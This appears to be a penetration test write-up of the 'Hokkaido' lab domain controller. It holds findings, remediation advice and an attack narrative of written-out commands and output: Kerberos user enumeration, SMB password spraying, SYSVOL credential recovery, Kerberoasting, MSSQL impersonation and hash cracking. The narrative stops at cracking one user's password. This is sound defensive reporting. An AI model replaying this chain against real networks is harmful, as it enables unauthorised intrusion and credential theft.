# Penetration Test Report:
## Hokkaido

### Executive Summary
I conducted a gray box penetration test for Hokkaido machine to determine the exposure of the target network. The goal of this penetration testing was to define if a remote attacker could penetrate Hokkaido machine's defenses and determining the impact of such a security breach.

During the assessment, multiple high and critical severity issues were found which lead for an external attacker to compromise the domain controller at the end. Due to that, the overall risk identified to Hokkaido machine as a result of the penetration test
is High. t is reasonable to believe that a malicious entity would be able to successfully
execute an attack against Hokkaido machine through targeted attacks.

Successful exploitation may result in interrupting the business, stealing confidential or
PII data, or modifying data which can have severe financial impact overall.

In addition to high and critical severity findings, we also observed several positive
controls. For example, there were no exploitable vulnerabilities on the OS itself, and the account "maintenance" had uncrackable password.

### High-Level Results
During the penetration test, there were multiple high and critical severity vulnerabilities
discovered. The vulnerabilities detected were password
policy, server security misconfigurations, and
credential management.

Due to these misconfigurations, it was possible to obtain domain user credentials for
further attacks. Also, as SMB was misconfigured on the machine, it was possible to access a plain-text password of a user. Moreover, due to permission miss-configuration lead to access to SAM and SYSTEM files that exposed the administrator NTLM hash.

Due to the severity and nature of these attacks, it’s strongly recommended to
remediate the vulnerabilities as soon as possible.

### Prioritized Recommendations
Based on the penetration testing results, I make the following key
recommendations:

1. Patch Management: All assets should be kept current with latest-vendor
supplied security patches. This can be achieved with vendor-native tools or
third party applications, which can provide an overview of all missing patches. In
many instances, third-party tools can also be used for patch deployment
throughout a heterogeneous environment.
2. Credential Management and Protection: Encourage and train employees on
how to use a password manager to securely store such sensitive information.
3. SMB Security Settings: It’s highly recommended to enforce SMB Signing
through Group Policies on all the servers in the domain. To this end, enable
Microsoft network server. Always digitally sign communications.
4. Password Policy: Introduce a domain-wide strong password policy to prevent
brute-forcing attacks to gather clear-text credentials. For this pentest, I was provided with one externally accessible IP address.

### About the Penetration Test
I was tasked with performing a gray box penetration test on the Hokkaido machine. A gray box penetration test is a simulated attack against the system/s to determine if an attacker can breach the perimeter and get domain admin privileges in the internal Active Directory (AD) environment. For this pentest, I was provided with one externally accessible IP address.

The focus of this test was to perform attacks, similar to those that might be conducted
by a malicious entity, and attempt to infiltrate Hokkaido machine’s systems - the
hokkaido-aerospace.com domain. The overall objective of this assessment was to evaluate the network, identify systems, and exploit flaws while reporting the findings.

In the following sections, we will provide the main results from the penetration test
with detailed explanations and the recommendations to remediate the vulnerabilities.

### Scope
● Network-level penetration testing against the host

During this penetration test, the following asset in the scope was targeted. The
specific IP address was as below:

1. DC and Web server (Hokkaido): 192.168.192.40

There were no specific restrictions or specific hours to conduct the gray box testing
except:
● A rule against attacks that could have harmed the systems’ functionalities
● Breaking the law
● Denial of Service attacks that interrupt the servers at the network or application
layer

The following diagram shows the initial network overview of provided targets.

<img width="1536" height="1024" alt="ChatGPT Image Jul 22, 2025, 09_07_04 PM" src="https://github.com/user-attachments/assets/bfb5b520-9ac2-4bc1-ab78-6ce110370b8f" />


### **Weak Password Policy and Credential Reuse**

**Vulnerability**: Domain Users with Weak or Reused Credentials  
**Severity**: Critical  
**Host**: DC (192.168.192.40)

**Description**:  
During the assessment, several domain user accounts were found to be using weak or reused passwords. For instance, the `info` account was accessible with the credentials `info:info`. Additionally, a clear-text password (`Start123!`) was discovered in an SMB share accessible to low-privileged users. This password allowed access to the `discovery` user account. These issues highlight a lack of secure password policies and poor credential management practices across the domain.

**Impact**:  
The use of weak and repeated passwords enabled initial access to the environment, followed by lateral movement through the compromise of additional accounts. This led to privilege escalation within the domain and ultimately contributed to the complete compromise of the internal Active Directory environment.

**Remediation**:  
It is strongly recommended to enforce a domain-wide strong password policy that includes a minimum password length, complexity requirements, and restrictions on password reuse. Users should be advised to use password managers to securely store their credentials. Any credentials stored in plaintext within shared folders must be removed immediately, and permissions on shared directories such as `SYSVOL` should be regularly reviewed and restricted where necessary.

### **Misconfigured SMB Share and Exposure of Plain-Text Credentials**

**Vulnerability**: Insecure SMB Share Permissions  
**Severity**: High  
**Host**: DC (192.168.192.40)

**Description**:  
The domain controller exposed the `SYSVOL` share to low-privileged users. Within this share, a text file (`password_reset.txt`) was identified inside the scripts directory. This file contained a valid domain user password in clear text. The credentials were subsequently used to gain access to another account within the domain, enabling further lateral movement.

**Impact**:  
Improper share permissions allowed the exposure of sensitive credentials to unauthorised users. The ability to retrieve valid user credentials directly contributed to the compromise of additional accounts and increased the attack surface of the domain environment.

**Remediation**:  
It is advised to perform a full audit of SMB share permissions on the domain controller. Sensitive credentials should never be stored in plain text, particularly within commonly accessible shares. Access to shares such as `SYSVOL` and `NETLOGON` should be restricted to only those accounts that require it. Monitoring for access to these shares should also be enabled to detect suspicious activity in real time.

### **Kerberoasting Leading to Domain Privilege Escalation**

**Vulnerability**: Service Accounts with SPNs Exposed to Kerberoasting  
**Severity**: High  
**Host**: DC (192.168.192.40)

**Description**:  
Two service accounts (`discovery` and `maintenance`) were identified with associated SPNs. These accounts were vulnerable to Kerberoasting, allowing the retrieval of their TGS hashes via `GetUserSPNs`. The hash for `discovery` was retrieved and cracked successfully, which enabled further access into the domain. Although the `maintenance` account hash could not be cracked, the exposed TGS tickets still represent a high-value target for offline attacks.

**Impact**:  
The exposure of SPNs enabled the offline brute-forcing of service account credentials. Successful cracking of one account (`discovery`) led to the compromise of the SQL server and access to sensitive information, which directly contributed to domain privilege escalation.

**Remediation**:  
Avoid using privileged accounts with SPNs. Use complex, long passwords for service accounts, rotate them regularly, and monitor TGS requests for anomalies. Where possible, use Group Managed Service Accounts (gMSA) to avoid static credentials altogether.

### **SQL Server Misconfiguration and Improper Role Delegation**

**Vulnerability**: SQL Server Account with Excessive Permissions  
**Severity**: High  
**Host**: DC (192.168.192.40)

**Description**:  
The account `discovery` was able to authenticate to the SQL Server instance using previously obtained credentials. Once inside, impersonation capabilities were discovered and used to escalate to `hrappdb-reader`. This access provided direct retrieval of hardcoded credentials for the `hrapp-service` account from the `sysauth` table.

**Impact**:  
Weak permission design within the SQL Server instance allowed an attacker to impersonate another account and extract valid service account credentials, which were later used to conduct targeted Kerberoasting attacks.

**Remediation**:  
Audit SQL Server roles and impersonation rights. Remove unnecessary `IMPERSONATE` permissions and avoid storing passwords in application databases. Service credentials should be stored securely using a vault mechanism and never in plaintext.

### **Account Misconfiguration: Password Reset Without Forced Change**

**Vulnerability**: Lack of Password Change Requirement After Reset  
**Severity**: High  
**Host**: DC (192.168.192.40)

**Description**:  
The account `discovery` was found with a default password (`Start123!`) stored in a plaintext file (`password_reset.txt`) accessible from the SYSVOL share. The account remained accessible with this password, indicating that the domain policy did not enforce a password change upon next login. This is a misconfiguration that increases the risk of credential reuse and compromise.

**Impact**:  
Without a mandatory password change on initial login, any disclosed or leaked password can be used by an attacker indefinitely. In this case, it allowed the reuse of known credentials to access internal systems, escalate privileges, and eventually compromise the domain. This is especially dangerous when default or reset credentials are stored in locations accessible to non-privileged users.

**Remediation**:  
Ensure that all user accounts, particularly those with reset or default credentials, are configured to require a password change upon next login. This can be enforced via Group Policy settings. Additionally, review and restrict access to locations like SYSVOL to prevent the exposure of sensitive information, and implement logging to detect unauthorised access to shared files.

## Attack Narrative
### Information Gathering on the Scope

To begin the assessment, I conducted a full TCP port scan using Nmap on the provided target. I saved the externally accessible IP address given by the client into a text file (`scope.txt`) and used the following command:
```
nmap -o scope.txt -p- -sV -sC 192.168.192.40
```
From the scan results, I confirmed access was limited to the IP address `192.168.192.40`. This host appeared to serve both as the domain controller and web server within the internal network.

The Nmap output revealed multiple open ports and services typically associated with an Active Directory environment, including SMB (445), Kerberos (88), LDAP (389/636), RDP (3389), and MS SQL (1433). IIS was also running on ports 80 and 8530, which indicated the presence of a Windows-based web server. Based on these findings, I identified the target as a likely domain controller within a Windows domain, named `hokkaido-aerospace.com`.

Initial enumeration efforts were focused on accessible SMB shares and the web server to identify a viable attack vector. This included attempting to enumerate user accounts, identify weak credentials, and explore any misconfigurations that could be leveraged to gain access to internal systems.
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 10:47:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:unsupported, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-07-19T10:48:13+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:unsupported, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-07-19T10:48:13+00:00; 0s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   192.168.192.40:1433: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-07-19T10:48:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-02T02:28:44
|_Not valid after:  2054-08-02T02:28:44
| ms-sql-info: 
|   192.168.192.40:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-19T10:48:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1: unsupported, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
==3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)==
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1: unsupported, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-07-19T10:48:13+00:00; 0s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HAERO
|   NetBIOS_Domain_Name: HAERO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hokkaido-aerospace.com
|   DNS_Computer_Name: dc.hokkaido-aerospace.com
|   DNS_Tree_Name: hokkaido-aerospace.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-07-19T10:48:03+00:00
|_ssl-date: 2025-07-19T10:48:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Not valid before: 2025-07-18T10:45:29
|_Not valid after:  2026-01-17T10:45:29
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 403 - Forbidden: Access is denied.
8531/tcp  open  unknown
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
58538/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   192.168.192.40:58538: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 58538
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-02T02:28:44
|_Not valid after:  2054-08-02T02:28:44
|_ssl-date: 2025-07-19T10:48:13+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   192.168.192.40:58538: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-19T10:48:06
|_  start_date: N/A
```

### Brute force on Kerberos on port 88:
To identify valid usernames within the domain, I performed a brute-force user enumeration attack against the Kerberos service running on port 88 of the domain controller (`192.168.192.40`). The following tool and command were used:
```
kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.192.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100

2025/07/19 12:28:58 >  Using KDC(s):
2025/07/19 12:28:58 >   192.168.192.40:88

2025/07/19 12:28:58 >  [+] VALID USERNAME:       info@hokkaido-aerospace.com
2025/07/19 12:28:58 >  [+] VALID USERNAME:       administrator@hokkaido-aerospace.com
2025/07/19 12:28:58 >  [+] VALID USERNAME:       INFO@hokkaido-aerospace.com
2025/07/19 12:29:00 >  [+] VALID USERNAME:       Info@hokkaido-aerospace.com
2025/07/19 12:29:01 >  [+] VALID USERNAME:       discovery@hokkaido-aerospace.com
2025/07/19 12:29:01 >  [+] VALID USERNAME:       Administrator@hokkaido-aerospace.com
2025/07/19 12:29:33 >  [+] VALID USERNAME:       maintenance@hokkaido-aerospa
```
The results confirmed that several usernames were valid within the domain `hokkaido-aerospace.com`. The Kerberos service responded differently to valid usernames than invalid ones, allowing enumeration through response timing and status codes.

### **Password Spray Against SMB (Port 445):**

Following the enumeration of valid usernames via Kerberos, I conducted a password spray attack over SMB to identify weak or reused credentials. The spray was performed using `crackmapexec` with the following command:
```
 crackmapexec smb 192.168.192.40 -u users.txt -p passowrds.txt

SMB         192.168.192.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\info:Winter2023 STATUS_LOGON_FAILURE 
SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\info:Summer2023 STATUS_LOGON_FAILURE 
SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\info:Spring2023 STATUS_LOGON_FAILURE 
SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\info:Fall2023 STATUS_LOGON_FAILURE 
==SMB         192.168.192.40  445    DC               [+] hokkaido-aerospace.com\info:info
```
The `users.txt` file contained valid domain usernames discovered during the Kerberos brute-force step. The password wordlist (`passowrds.txt`) was **manually crafted based on two key elements**:

1. **The year the machine was operating in**, as seen from Kerberos and system timestamps (2023).
    
2. **The usernames found in earlier enumeration**, along with simple transformations (e.g., reversed strings and case variations).
```
Winter2023
Summer2023
Spring2023
Fall2023
info
administrator
discovery
maintenance
ofni
rotartsinimda
yrevocsid
ecnanetniam
```

This approach proved effective. One valid credential pair was identified:
```
Username: info  
Password: info
```
This confirmed that the `info` account was using weak and predictable credentials. Authentication was successful via SMB against the domain controller (`192.168.192.40`). The `info` account was then used to enumerate SMB shares and begin further internal enumeration of the environment.

### **SMB Share Enumeration and Credential Disclosure:**

Using the valid `info:info` credentials obtained from the SMB password spray, I enumerated accessible shares on the domain controller (`192.168.192.40`) with the following command:
```
crackmapexec smb 192.168.192.40 -u info -p info --shares
  
SMB         192.168.192.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.192.40  445    DC               [+] hokkaido-aerospace.com\info:info 
SMB         192.168.192.40  445    DC               [+] Enumerated shares
SMB         192.168.192.40  445    DC               Share           Permissions     Remark                                                                
SMB         192.168.192.40  445    DC               -----           -----------     ------                                                                
SMB         192.168.192.40  445    DC               ADMIN$                          Remote Admin                                                          
SMB         192.168.192.40  445    DC               C$                              Default share                                                         
SMB         192.168.192.40  445    DC               homes           READ,WRITE      user homes                                                            
SMB         192.168.192.40  445    DC               IPC$            READ            Remote IPC                                                            
SMB         192.168.192.40  445    DC               NETLOGON        READ            Logon server share                                                    
==SMB         192.168.192.40  445    DC               SYSVOL          READ            Logon server share==                                                    
SMB         192.168.192.40  445    DC               UpdateServicesPackages READ            A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.     
SMB         192.168.192.40  445    DC               WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.                                                     
SMB         192.168.192.40  445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.  
```

The command confirmed access to several readable shares, including:

- `NETLOGON`
    
- `SYSVOL`
    
- `homes` (with READ,WRITE permissions)
    
- `UpdateServicesPackages`, `WsusContent`, and others
    

Of particular interest was the `SYSVOL` share, which is often used to distribute scripts and policies across the domain. I accessed it using `smbclient`:
```
smbclient -N //192.168.192.40/SYSVOL -U info%info

smb: \> ls
  .                                   D        0  Sat Nov 25 13:11:08 2023
  ..                                  D        0  Sat Nov 25 13:11:08 2023
  hokkaido-aerospace.com             Dr        0  Sat Nov 25 13:11:08 2023

smb: \> cd hokkaido-aerospace.com\
smb: \hokkaido-aerospace.com\> ls
  .                                   D        0  Sat Nov 25 13:17:33 2023
  ..                                  D        0  Sat Nov 25 13:11:08 2023
  DfsrPrivate                      DHSr        0  Sat Nov 25 13:17:33 2023
  Policies                            D        0  Sat Nov 25 13:11:13 2023
  scripts                             D        0  Sat Nov 25 13:40:08 2023

smb: \hokkaido-aerospace.com\scripts\> cd temp\
smb: \hokkaido-aerospace.com\scripts\temp\> ls
  .                                   D        0  Wed Dec  6 15:44:26 2023
  ..                                  D        0  Sat Nov 25 13:40:08 2023
  password_reset.txt                  A       27  Sat Nov 25 13:40:29 2023

smb: \hokkaido-aerospace.com\scripts\temp\> get password_reset.txt 
getting file \hokkaido-aerospace.com\scripts\temp\password_reset.txt of size 27 as password_reset.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

Upon navigating to:
```
\hokkaido-aerospace.com\scripts\temp\
```
I discovered a file named `password_reset.txt`.

I downloaded the file using the `get` command:
```
smb: \hokkaido-aerospace.com\scripts\temp\> get password_reset.txt
```
The file contained a clear-text password:
```
Initial Password: Start123!
```
This credential was later found to be active for the `discovery` user account and was successfully used to authenticate to domain services. This confirmed that **sensitive credentials were stored in plaintext within an accessible SMB share**.
```
crackmapexec smb 192.168.192.40 -u users.txt -p Start123!    

SMB         192.168.192.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\info:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\administrator:Start123! STATUS_LOGON_FAILURE 
==SMB         192.168.192.40  445    DC               [+] hokkaido-aerospace.com\discovery:Start123!==
```

### **Kerberoasting Service Accounts:**

After authenticating successfully as the `discovery` user (via credentials extracted from the SYSVOL share), I enumerated Service Principal Names (SPNs) within the domain to identify Kerberoastable accounts. I used the following command from the Impacket toolkit:
```
impacket-GetUserSPNs -request -dc-ip 192.168.192.40 hokkaido-aerospace.com/discovery
```
This command retrieved TGS tickets for accounts with associated SPNs. The results showed two service accounts configured with SPNs:

- `discovery@hokkaido-aerospace.com`
    
- `maintenance@hokkaido-aerospace.com`

Both accounts had their TGS tickets retrieved in hash format (`$krb5tgs$23$...`). These hashes can be cracked offline to recover the plaintext passwords, providing an avenue for privilege escalation without triggering alerts in real time.

I saved the two ticket hashes for offline cracking. The `discovery` hash was already known, and although I attempted to crack the `maintenance` account using a custom and common password wordlist, the password could **not** be recovered within a reasonable timeframe.

This indicates that while **the `maintenance` account is vulnerable to Kerberoasting**, its password is likely complex and was not immediately crackable during the assessment period.

### Initial access via MSSQL Impersonation:

After obtaining valid credentials for the `discovery` user (`Start123!`), I attempted authentication against the MS SQL Server instance running on the domain controller (`192.168.192.40`). Using the Impacket `mssqlclient.py` tool with Windows authentication, I was able to connect successfully:
```
impacket-mssqlclient hokkaido-aerospace.com/discovery:"Start123\!"@192.168.192.40 -windows-auth

SQL (HAERO\discovery  guest@master)> enum_db msdb
name      is_trustworthy_on   
-------   -----------------   
master                    0   

tempdb                    0   

model                     0   

msdb                      1   

hrappdb                   0   

had no permission to access hrappdb! 

SQL (HAERO\discovery  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee          grantor          
----------   --------   ---------------   ----------   --------------   --------------   
b'LOGIN'     b''        IMPERSONATE       GRANT        HAERO\services   hrappdb-reader

SQL (hrappdb-reader  hrappdb-reader@hrappdb)>  SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
[%] SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
hrappdb         dbo            sysauth      b'BASE TABLE'

SQL (hrappdb-reader  hrappdb-reader@hrappdb)> select * from sysauth;
[%] select * from sysauth;
id   name               password           
--   ----------------   ----------------   
 0   ==b'hrapp-service'   b'Untimed$Runny'==   

Upon establishing a connection, I explored the available commands and began enumeration of databases and permissions.
```

I discovered that although access to the `hrappdb` database was initially restricted, impersonation rights were granted through the following SQL role delegation:
GRANTEE: HAERO\services  
GRANTOR: hrappdb-reader  
PERMISSION: IMPERSONATE LOGIN
Using the impersonation feature, I escalated privileges by impersonating the `hrappdb-reader` account:
```
EXECUTE AS LOGIN = 'hrappdb-reader';
```
With this elevated context, I accessed the `hrappdb.INFORMATION_SCHEMA.TABLES` structure and discovered a table named `sysauth`. Querying this table revealed plaintext service account credentials:
```
Username: hrapp-service  
Password: Untimed$Runny
```
This credential was subsequently used for further Kerberoasting attacks, and contributed to the chain of escalation toward full domain compromise.

### **Mapping Privilege Escalation Paths with BloodHound:**

With credentials recovered for the `hrapp-service` account (`Untimed$Runny`) via SQL Server impersonation, I authenticated to the domain and used BloodHound to enumerate Active Directory relationships and privilege paths. Data was collected using SharpHound, and the resulting `.zip` file was imported into the BloodHound GUI for analysis.

The graph produced by BloodHound revealed a complete attack path from a low-privileged service account to **Domain Admin**.

#### Notable Path Relationships:

- `HRAPP-SERVICE@hokkaido-aerospace.com` had **GenericWrite** rights over `HAZEL.GREEN@hokkaido-aerospace.com`, meaning I could modify attributes such as `servicePrincipalName` to perform Kerberoasting or direct password reset attacks.
    
- `Hazel.Green` was a direct member of the `TIER2-ADMINS` group.
    
- The `TIER2-ADMINS` group had a **ForceChangePassword** right over `MOLLY.SMITH`, allowing for credential control or account takeover.
    
- `MOLLY.SMITH` was a member of `TIER1-ADMINS`, which had **RDP access** (`CanRDP`) to the Domain Controller (`DC.HOKKAIDO-AEROSPACE.COM`).
    
- Access to the DC enabled interaction with sensitive Active Directory objects, including the `USERS` container, which **contained accounts in the `DOMAIN ADMINS` group** — thereby concluding the escalation chain.
    

This demonstrated a realistic and fully exploitable path to domain dominance through **ACL abuse, misconfigured privileges, and lack of tier separation**.

The attack chain was visually confirmed in the BloodHound graph below:

<img width="1071" height="651" alt="Pasted image 20250719134139" src="https://github.com/user-attachments/assets/0e605951-7e7b-4616-9d20-1bc8c334ac2e" />

### **Targeted Kerberoasting via ACL Abuse**

After retrieving the `hrapp-service` credentials (`Untimed$Runny`) from the SQL Server, BloodHound analysis showed that the service account had **GenericWrite** permissions over the `Hazel.Green` user object in Active Directory. This type of misconfiguration allows attackers to modify attributes such as `servicePrincipalName`, making the account Kerberoastable.

Using the `targetedKerberoast.py` tool, I executed a precise Kerberoasting attack against `Hazel.Green` with the following command:
```
./targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.192.40

$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$a84f5b31a019e84d6d7d05c2b6d4b654$9994957ef6c5afd27552c70fa4318620b5c62ff56ab87af3ec4e309c113e78ad4b1769fae755f7059831b6e9725d16195118390c3a3f61ab5c3e548abb1464a3ed827d3df9fafec9296a2396fbb186c7e7c8f516cb4ee5e9fbd38c32c1a54c18974ea68c43c912877a7b181b084bef4e9deb79c5eb30ca9dc794eb41cb2c5c1b0668c4dac787f22d1ae58eadd12a15fd2a5879b261455628703782cbd2fa5e79ca9d121dd12dc2b6234aa498bceaec3c7b9d0c3d4a5c4444af4ddcc4fab3d10544af74b7ea3a372e88bd0ecac1e043eb1c4239c96737ee1f955a43a098e7c254f4019b3a283e1b86413c7fbf058106cf1522041b300d677dcb8002a827f1678713f9da60b9f5f207d96068ec1fd7ef3028f3659356f999c1f85b69f06cef3f5e06eb9299657ad09360b67c1bcfa1b86080f73c307c555844b29463cf1f85c1cdf503ca82d535cd9ed4083559f031dce8d719f314216540a834ca136d84e8674dfcbfed9be8f02bf64c3f28407c1933038584d1a202643d9cac8ed3c039e9c3e45f57d68d7eb2342762f893fc0389e45331caa5063d33d089576d3ef5e5f5df38f219bf7a2011bcaa0c0e2cb13cb3dd07acd698b06f4f6787421f9465e5fff2c4403846284d39b88c94b16c52da63a3b7e8486a188e2162d076f38ccfa16449edec539f6a1a3baed5a5cd0901c65684e267ff10dbad5bcfd634fd9e44deff510444b08703b00a742f52cee79dad317be3344219dcb8826f620841ecf01feba62311be859210c0c3eb5684b06ddc63e81fa64b6f5990dad02d50b1d9a59461bcd95f2ad629f09cec8e064aa6d243c0bd86641a4a0c622d4cec3dc4a5e76d6e59073aa7a84f0e5b01d2b9926ac7d6eba7d31fe6cc7ac9afe40b80f766da7f9eb2d53ac8ae559b9f633b8165d89ce6c067dae9e0f76867e15c1343ba80e6efa9653d8ce048f1880577d04110938100205e3181c1cc4fd5fbbaf7d7879ab145c9d178ac6772652ddf6b9d6afe26411790164690456c0846f3d2b53fcdaea50bf08b1a5c11bae15dcb1864956065de1ebb656fa5f0188c8ad399afaf9887eefb46b4d0bdc3db240f36419667ec0c62cd60719414092758f0208613ccee0d66926208a8dc83a3142fc636d41464d3ed540bef39234dec938d2582ae303b650b627f71a3f1b5bd8ca2ccbf3cb72d27a3e3af33019696260ea6e7bf6ac687e8a7270d6f3923d3a1c3be121b7d895e5c4d4f4e4bad1c6a6cdb68adec3be8da6064bd71a4de1d8147db3fbea317c2442309c272317d2e79aaaf3c4984bc8dd3433b6edf3cb9fc7e95df036dca1783108f280da4e55f3b6b07b43b383f3ad6b722c384c79e2c7a2b3f8ec19243fc0daf663ab7f78f4a5e8f7d7019d2c2974af06bd1450410c09624002756435a0beedf244c05489c673550a3bfcea84e2a65297b8319c2f329bb78278b2f4cc3a4f9782e8b552292c57bd6ae80cbc767c4641dbbf671e4b6ce2d7bddd63a2856cf53b1f9dc0ba7b36cf89b53e18b41db9d348801fc6c2be473a66a5ff32673079131fa2d466ff854036d6b342b34ed8d3c48be33b0209bdbf0e81f66012480cd8b129cd70f0301245b1ee0fa10353760c7bc5a5fb32ffb263ead296037f83f26a7bedcfb3e
```

This attack:

- Added a fake SPN to `Hazel.Green`
    
- Requested a TGS ticket from the Domain Controller
    
- Extracted the **TGS hash** in `$krb5tgs$23$...` format
    
- Cleaned up by removing the fake SPN automatically

The extracted hash for `Hazel.Green` was saved for offline cracking using john the riper:
```
john kerberoast.hash -w=/usr/share/wordlists/rockyou.txt
```
john kerberoast.hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
haze1988         (?)  

John successfully cracked the hash:
```
Username: Hazel.Green  
Password: haze1988
```
